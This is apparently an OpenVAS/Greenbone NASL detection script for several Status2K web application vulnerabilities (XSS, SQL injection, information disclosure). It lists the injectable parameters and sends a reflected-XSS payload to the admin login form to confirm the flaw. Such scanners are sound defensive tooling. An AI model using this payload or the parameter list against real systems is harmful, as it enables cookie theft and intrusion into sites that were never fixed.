if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804736" );
	script_version( "2020-10-27T15:01:28+0000" );
	script_cve_id( "CVE-2014-5088", "CVE-2014-5089", "CVE-2014-5090", "CVE-2014-5091", "CVE-2014-5092", "CVE-2014-5093", "CVE-2014-5094" );
	script_bugtraq_id( 69012, 69015, 69017, 69008, 69009, 69013, 69010 );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2020-10-27 15:01:28 +0000 (Tue, 27 Oct 2020)" );
	script_tag( name: "creation_date", value: "2014-08-08 11:40:09 +0530 (Fri, 08 Aug 2014)" );
	script_name( "Status2K Multiple Vulnerabilities" );
	script_tag( name: "summary", value: "This host is installed with Status2K and is prone to multiple
  vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted exploit string via HTTP GET request and check whether it is
  possible to read cookie or not." );
	script_tag( name: "insight", value: "Multiple flaws are due to input sanitization error,

  - 'Username' parameter the login.php script.

  - 'log' GET parameter to the /s2kdir/admin/options/logs.php script.

  - 'Location' parameter to the addlog.php script.

  - 'multies' parameter to the /s2k/includes/functions.php script.

  - 'templates' parameter to the /admin/options/editpl.php script.

  - Failing to remove the /install/ installation directory after the program
  has been installed.

  - Failed to block phpinfo action on the index.php page." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code, manipulate SQL queries in the backend database, and disclose
  certain sensitive information." );
	script_tag( name: "affected", value: "Status2K" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/34239" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/127719" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
http_port = http_get_port( default: 80 );
if(!http_can_host_php( port: http_port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/status2k", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: NASLString( dir, "/admin/login.php" ), port: http_port );
	if(ContainsString( rcvRes, ">Status2k" )){
		url = dir + "/admin/login.php";
		postData = "username=%3Cscript%3Ealert%28document.cookie%29" + "%3C%2Fscript%3E&password=&Submit=Login+%3E%3E";
		host = http_host_name( port: http_port );
		sndReq = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n", "\\r\\n", postData );
		rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq, bodyonly: FALSE );
		if(IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes, "<script>alert(document.cookie)</script>" ) && ContainsString( rcvRes, ">Status2k" )){
			security_message( port: http_port );
			exit( 0 );
		}
	}
}
exit( 99 );

